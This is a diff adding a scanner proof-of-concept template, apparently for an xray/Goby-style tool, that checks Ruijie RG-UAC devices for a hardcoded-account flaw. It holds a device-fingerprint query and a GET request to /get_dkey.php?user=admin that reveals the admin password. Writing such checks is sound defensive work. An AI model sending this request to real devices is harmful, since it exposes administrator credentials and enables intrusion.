@@ -1,0 +1,17 @@
+name: RG-UAC
+manual: true
+query: title="RG-UAC登录页面"
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /get_dkey.php?user=admin
+      follow_redirects: true
+    expression: response.status == 200 && response.body.bcontains(b"password")
+expression: r0()
+detail:
+  author: gobysec@gmail.com
+  links:
+  - https://gobies.org/
+  description: 锐捷RG-UAC 账户硬编码漏洞
